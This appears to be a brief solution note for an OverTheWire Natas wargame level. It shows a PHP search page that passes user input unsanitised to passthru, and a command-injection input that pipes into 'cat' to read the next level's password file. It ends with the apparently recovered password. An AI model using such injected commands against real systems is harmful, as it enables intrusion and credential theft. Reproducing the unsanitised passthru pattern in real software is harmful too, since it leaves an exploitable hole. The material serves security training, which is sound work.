add this to search bar | cat /etc/natas_webpass/natas10

<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>

If you check passthru docs, you realize its basically exec. The rest is history.

t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu